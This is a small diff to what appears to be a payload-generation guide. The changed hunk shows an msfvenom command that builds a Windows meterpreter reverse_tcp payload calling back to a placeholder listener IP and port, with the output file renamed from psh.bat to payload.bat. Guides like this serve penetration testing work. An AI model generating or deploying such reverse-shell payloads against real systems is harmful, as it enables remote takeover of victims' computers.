@@ -51,7 +51,7 @@ Replace `<YOUR_IP>` with your listener's IP address and `<YOUR_PORT>` with your 
 msfvenom -p windows/meterpreter/reverse_tcp \
   lhost=<YOUR_IP> \
   lport=<YOUR_PORT> \
-  -f psh-cmd > psh.bat
+  -f psh-cmd > payload.bat
 ```
 
 ### 🐧 Linux — x64
